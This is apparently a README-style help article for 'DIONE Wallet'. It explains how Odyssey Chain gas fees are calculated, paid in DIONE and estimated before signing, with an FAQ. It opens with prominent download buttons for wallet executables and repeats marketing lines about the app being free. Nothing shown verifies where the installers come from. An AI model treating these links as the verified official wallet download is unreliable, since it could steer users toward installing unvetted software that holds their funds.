![DIONE Wallet](assets/banner-article.png)

# Odyssey Chain Gas Fees Inside DIONE Wallet

<p align="center">What a transaction really costs</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="assets/button-windows.png" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

Every transaction on Odyssey Chain pays a fee in DIONE to the network, calculated from the gas the transaction used and the gas price at the time. DIONE Wallet charges nothing on top of that: the app is free to download and free to use, and the only cost of a send, a stake or a swap is the network fee plus whatever the venue charges.

## What the fee is made of

Two numbers multiply. **Gas used** is how much computation the transaction needed - a plain transfer is cheap, a swap that touches several contracts costs more. **Gas price** is what the network is accepting at that moment, and it moves with demand.

The product is the fee, paid in DIONE. Because the native currency is the fee currency, an account holding tokens but no DIONE cannot transact at all. That is the single most common funding mistake on this chain: the portfolio looks healthy, and every action fails on gas.

## Who receives it

The fee goes to the network, not to the wallet's operator. There is no subscription, no service charge and no in-app purchase; the project describes the product as free to download and free to use, with network fees as the only cost of using it.

This matters when reading an error message. "Insufficient funds for gas" is a statement about your DIONE balance, not about an unpaid bill.

## Estimating before you send

The wallet estimates the fee before you sign, and the estimate is based on recent blocks. Two consequences are worth expecting:

- **A busy network raises the estimate.** The same send can cost more at a different hour, not because the wallet changed but because the market for block space did.
- **A complex action costs more.** Approving a token, then swapping, is two transactions and two fees - which is why a swap can appear to cost more than a transfer.

If an estimate looks implausibly large for a simple transfer, check the active network first; a custom network with an unusual fee market will price in its own currency.

## Keeping enough DIONE for fees

Leave a working balance in the native coin. A practical habit: keep enough for several transactions at the current estimate rather than exactly one, so a replacement transaction or a second step in a swap does not stall on an empty balance.

Staking complicates this. Delegated DIONE is committed to a validator, so the spendable balance is what remains after the delegation. A wallet that staked everything can find itself unable to pay for the unbonding transaction later - leaving a small reserve avoids that, and [Unstake DIONE and Wait Out the Unbonding Period](https://github.com/dione-protocol/staking-and-network/blob/main/unstake-dione-and-wait-for-unbonding.md) explains the timing that makes the reserve matter. [How to Stake DIONE Coin](https://github.com/dione-protocol/staking-and-network/blob/main/how-to-stake-dione-coin.md) covers the delegate step that spends the first fee.

## Fees on the three actions people ask about

| Action | Fee payer | Notes |
| --- | --- | --- |
| Sending DIONE | the sender, in DIONE | one transaction, cheapest of the three |
| Staking or unstaking | the delegator, in DIONE | separate transactions for delegate and undelegate |
| Swapping or bridging | the initiator, in DIONE, plus venue cost | an approval often precedes the swap, so two fees |

Bridging has its own cost structure on top of the Odyssey fee: the bridge charges for moving value between chains, and that charge is separate from gas. [Bridge DIONE to Odyssey Chain With Wanchain](https://github.com/dione-protocol/keys-and-transfers/blob/main/bridge-dione-to-odyssey-with-wanchain.md) sets out what to expect there, including why a bridge can ask for more DIONE than a plain transfer does.

## When a fee looks wrong

Three causes account for almost every surprise: the network was busy, the transaction was more complex than assumed, or the active network was not Odyssey Chain. The explorer shows what was actually paid - gas used and the effective price - which is the only figure that settles the question.

If the fee was charged and the transaction reverted, the loss is real and the reason is in the error, not in the fee. [DIONE Wallet Transaction Failed: Read the Error, Then Act](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-transaction-failed.md) covers that case, and [Fix a Stuck DIONE Wallet Transaction](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/fix-a-stuck-dione-wallet-transaction.md) covers the opposite one: a transaction that paid nothing because it never landed.

## Why the wallet shows the fee before signing

Because a fee you cannot see is a fee you cannot judge. The confirmation screen is the last place to notice that an action costs more than you expected, which is why the current build surfaces the estimate rather than folding it into a summary.

Reading it takes a second and catches the most expensive mistakes: a swap routed through an unfamiliar contract, a send on the wrong network, or a stake sized to leave nothing for fees.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Fee estimation and the confirmation screen are both refined between builds, so the estimate you see depends on the release you run. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before treating a surprising fee as a defect, then compare what you were quoted with what the explorer records. A fee charged twice for one action is worth reporting through [Get Help From DIONE Wallet Support](https://github.com/dione-protocol/keys-and-transfers/blob/main/get-help-from-dione-wallet-support.md), because it points at a duplicated submission rather than at network pricing.

## FAQ

### Does DIONE Wallet charge a fee?

No. The app is free to download and free to use. The only cost is the network fee, paid in DIONE to the validators who process the transaction.

### Who receives the network fee when I send DIONE?

The network does, not the wallet's operator. There is no account, no subscription and no in-app charge to pay.

### Why can I not send when I have tokens?

Because the fee is paid in the native coin. An account holding tokens but no DIONE cannot pay for a transaction, so receive a small amount of DIONE to the same address first.

### What is the minimum I can send?

There is no wallet-imposed minimum; the constraint is that the amount plus the fee must fit inside the spendable balance.

Gas is simple once separated from everything else: computation multiplied by price, paid in the native coin, collected by the network. If a transaction failed rather than costing more than expected, [DIONE Wallet Transaction Failed: Read the Error, Then Act](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-transaction-failed.md) is the next page; if the amount is pending rather than confirmed, [Fix a Stuck DIONE Wallet Transaction](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/fix-a-stuck-dione-wallet-transaction.md); and if the fee currency is the thing you are short of, the fix is a small receive to the same address rather than a new wallet.
